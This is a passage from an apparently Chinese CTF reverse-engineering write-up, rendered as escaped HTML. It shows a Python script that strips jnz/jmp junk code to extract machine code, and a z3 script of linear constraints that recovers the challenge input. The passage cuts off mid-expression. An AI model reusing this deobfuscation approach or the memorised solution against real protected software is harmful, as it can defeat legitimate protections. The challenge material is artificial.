&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(codes)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; codes[i]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;jnz&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; codes[i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;jnz&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(codes) &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; codes[j]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;jmp&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
            c&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(codes[j]&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
            j &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;

codes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;asm.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
codes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [i[:i&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;find(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; codes]

datas &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; codes:
    datas &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; unhexlify(i)
datas &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xc3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
print(datas)
open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mch1&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(datas)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;之前提取的时候同时打印了指令的二进制代码，主要原因是提取的指令无法使用 nasm 编译，用 pwntools 速度又太慢，不如直接提取&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;提取到的内容直接反编译就好了，得到一个大长串的式子&lt;/p&gt;
&lt;p&gt;提示说是需要对每个式子取绝对值，那就按照每次减常数来切割就行，最后的代码如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
a1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [BitVec(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;)]

con1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40085&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;222506&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54507&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88056&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;212571&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;160722&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;434973&lt;/span&gt;
con2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49300&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;259229&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;278066&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;127937&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;295169&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8368677&lt;/span&gt;
con3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42214&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108025&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;205972&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27559&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17114904&lt;/span&gt;
con4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;151496&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;204740&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80143&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12295783&lt;/span&gt;
con5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;241935&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;124128&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38790036&lt;/span&gt;
con6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;273221&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27868542&lt;/span&gt;
con7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;279656&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;199574&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;258130&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200399&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;173903&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;175816&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234569&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108273&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;222957&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128244179&lt;/span&gt;
con8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81541&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;268763&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;219073&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34782&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21153&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;173005&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76285&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32825&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13874925&lt;/span&gt;
con9 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85214&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;268299&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;230981&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;290772&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74394&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28044&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;242995&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50871139&lt;/span&gt;
con10 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;279656&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;199574&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;258130&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200399&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;173903&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;175816&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234569&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108273&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;222957&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;128244179&lt;/span&gt;
con11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81541&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;268763&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;219073&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34782&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21153&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;173005&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76285&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32825&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13874925&lt;/span&gt;
con12 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85214&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;268299&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;230981&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;290772&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74394&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28044&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;242995&lt;/span&gt; 